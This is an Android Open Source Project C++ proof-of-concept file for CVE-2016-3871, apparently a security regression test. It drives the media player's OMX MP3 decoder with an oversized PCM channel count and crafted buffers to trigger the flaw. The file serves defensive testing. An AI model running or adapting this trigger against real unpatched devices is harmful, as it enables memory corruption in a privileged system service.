/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#define LOG_TAG "CVE-2016-3871"

#include <OMX_Component.h>
#include <SharedMemoryBuffer.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <log/log.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <media/OMXBuffer.h>
#include <media/stagefright/foundation/AMessage.h>
#include <utils/String16.h>

using namespace android;

struct DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages __unused) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

bool doExp() {
  const char *codecName = "OMX.google.mp3.decoder";
  sp<IOMXNode> node;
  sp<IMemory> memory;
  int fenceFd = -1;
  int inBufferSize = 4096 * 16;
  int outBufferSize = 4096 * 32;

  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.player"));

  sp<IMediaPlayerService> mps = interface_cast<IMediaPlayerService>(binder);
  if (mps == NULL) {
    ALOGI("get media player service failed");
    return false;
  }

  // connect to IOMX each time
  sp<IOMX> service = mps->getOMX();
  if (service == NULL) {
    ALOGE("cannot get the OMX interface");
    return false;
  }

  sp<DummyOMXObserver> observer = new DummyOMXObserver();
  status_t err = service->allocateNode(codecName, observer, &node);
  if (err != OK) {
    ALOGI("%s node allocation fails", codecName);
    return false;
  }
  // IDLE
  err = node->sendCommand(OMX_CommandStateSet, OMX_StateIdle);
  if (err != OK) {
    ALOGE("sendCommand is failed in OMX_StateIdle, err: %d", err);
    node->freeNode();
    return false;
  }

  int paramsSize = sizeof(OMX_AUDIO_PARAM_PCMMODETYPE);
  OMX_AUDIO_PARAM_PCMMODETYPE *params = (OMX_AUDIO_PARAM_PCMMODETYPE *)malloc(
      sizeof(OMX_AUDIO_PARAM_PCMMODETYPE));
  if (params == NULL) {
    ALOGE("malloc failed");
    node->freeNode();
    return false;
  }

  memset(params, 0, sizeof(OMX_AUDIO_PARAM_PCMMODETYPE));
  params->nPortIndex = 1;
  params->nSize = sizeof(OMX_AUDIO_PARAM_PCMMODETYPE);
  params->nChannels = 32;
  params->nSamplingRate = 44100;

  err = node->setParameter(OMX_IndexParamAudioPcm, params, paramsSize);
  ALOGI("setparameter err: %d", err);
  if (err != OK) {
    ALOGE("set parameter error, err: %d", err);
    free(params);
    node->freeNode();
    return false;
  }

  IOMX::buffer_id inBufferId = 0;
  IOMX::buffer_id outBufferId = 0;
  sp<MemoryDealer> dealerIn = new MemoryDealer(inBufferSize);
  memory = dealerIn->allocate(inBufferSize);
  if (memory.get() == nullptr || memory->pointer() == nullptr) {
    ALOGE("memory allocate failed for port index 0, err: %d", err);
    free(params);
    node->freeNode();
    return false;
  }
  memset(memory->pointer(), 0x01, inBufferSize);
  OMXBuffer omxInBuf(memory);
  err = node->useBuffer(0, omxInBuf, &inBufferId);
  ALOGI("useBuffer, port index 0, err: %d", err);

  sp<AMessage> inputFormat = new AMessage;
  sp<MediaCodecBuffer> codecData;
  codecData = new SharedMemoryBuffer(inputFormat, memory);
  OMXBuffer omxInBufShared(codecData);

  sp<MemoryDealer> dealerOut = new MemoryDealer(outBufferSize);
  memory = dealerOut->allocate(outBufferSize);
  if (memory.get() == nullptr || memory->pointer() == nullptr) {
    ALOGE("memory allocate failed for port index 1, err: %d", err);
    free(params);
    node->freeNode();
    return false;
  }
  memset(memory->pointer(), 0xff, outBufferSize);
  OMXBuffer omxOutBuf(memory);
  err = node->useBuffer(1, omxOutBuf, &outBufferId);
  ALOGI("useBuffer, port index 1, err: %d", err);

  sp<AMessage> outputFormat = new AMessage;
  sp<MediaCodecBuffer> codecDataOut;
  codecDataOut = new SharedMemoryBuffer(outputFormat, memory);
  OMXBuffer omxOutBufShared(codecDataOut);

  err = node->sendCommand(OMX_CommandStateSet, OMX_StateExecuting);
  if (err != OK) {
    ALOGE("sendCommand is failed in OMX_StateExecuting, err: %d", err);
    free(params);
    node->freeNode();
    return false;
  }

  err = node->emptyBuffer(inBufferId, omxInBufShared, 1, 0, fenceFd);
  ALOGI("emptyBuffer, err: %d", err);

  err = node->fillBuffer(outBufferId, omxOutBufShared, fenceFd);
  ALOGI("fillBuffer, err: %d", err);

  free(params);
  err = node->freeNode();
  ALOGI("freeNode, err: %d", err);
  return true;
}

int main() { return (int)(!doExp()); }
